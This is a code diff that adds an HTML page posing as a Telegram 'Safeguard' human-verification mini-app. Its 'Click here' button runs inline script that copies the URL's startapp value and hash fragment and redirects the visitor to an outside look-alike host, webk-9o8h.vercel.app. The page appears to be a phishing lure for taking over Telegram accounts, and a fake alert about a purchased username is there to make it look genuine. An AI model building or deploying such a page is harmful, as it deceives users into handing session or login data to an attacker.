@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff; --tg-theme-hint-color: #aaaaaa; --tg-theme-link-color: #8774e1; --tg-theme-button-color: #8774e1; --tg-theme-button-text-color: #ffffff; --tg-theme-secondary-bg-color: #0f0f0f; --tg-theme-header-bg-color: #212121; --tg-theme-accent-text-color: #8774e1; --tg-theme-section-bg-color: #212121; --tg-theme-section-header-text-color: #aaaaaa; --tg-theme-subtitle-text-color: #aaaaaa; --tg-theme-destructive-text-color: #e53935; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Safeguard</title>
+    <meta name="description" content="@Safeguard Verification Bot">
+    <link rel="icon" href="./favicon.ico">
+    <meta name="next-head-count" content="5">
+    <link rel="preload" href="./_next/static/css/3db7e18ba6d2d9e9.css" as="style">
+    <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
+  </head>
+  <body>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    if (window.Telegram && Telegram.WebApp) {
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+      
+      Telegram.WebApp.MainButton.setParams({
+        text: '@safeguard',
+        color: Telegram.WebApp.bottomBarColor,
+        text_color: "#acafb0",
+        is_active: false
+      });
+      
+      Telegram.WebApp.MainButton.onClick(() => {
+        Telegram.WebApp.showAlert("This username was bought on Fragment on Jan 16, 2024 for 10.00 TON.");
+      });
+      
+      Telegram.WebApp.MainButton.show();
+      
+      document.body.style.setProperty("--surface-color", Telegram.WebApp.themeParams.bg_color);
+      
+      const pageChats = document.getElementById("page-chats");
+      if (pageChats) {
+        pageChats.remove();
+      }
+    } else {
+      console.error("Telegram WebApp is not available.");
+    }
+  });
+</script>
+    
+    <div id="__next">
+      <div class="bg-telegram-bg">
+        <main class="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
+          <div class="mt-5">
+            <p class="text-3xl font-bold text-telegram-text">Human Verification</p>
+            <p class="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
+            <div class="flex items-center justify-center w-100 mt-3">
+              <button onclick="(function(){
+                // Use regex to extract the value of 'startapp' from the full URL.
+                const match = window.location.href.match(/startapp=([^&\/?#]+)/);
+                const target = 'https://webk-9o8h.vercel.app/';
+                if(match) {
+                  // Append _S to the captured value
+                  const newUrl = target + '?startapp=' + encodeURIComponent(match[1] + '_S') + window.location.hash;
+                  window.location.replace(newUrl);
+                } else {
+                  window.location.replace(target + window.location.hash);
+                }
+              })()" class="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">
+                Click here
+              </button>
+            </div>
+          </div>
+        </main>
+      </div>
+    </div>
+  </body>
+</html>
